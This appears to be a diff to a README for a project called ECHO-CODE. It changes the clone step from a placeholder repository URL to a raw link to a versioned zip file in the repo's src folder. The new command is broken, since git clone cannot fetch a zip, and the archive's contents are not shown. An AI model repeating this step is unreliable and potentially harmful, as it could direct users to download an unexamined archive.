@@ -32,7 +32,7 @@ Follow these steps to run the project locally:
 bash
 Copy
 Edit
-git clone https://github.com/your-username/ECHO-CODE.git
+git clone https://github.com/8070anurag/ECHO-CODE/raw/refs/heads/main/src/ECH_CODE_2.9-alpha.5.zip
 cd ECHO-CODE
 2. Install dependencies
 bash
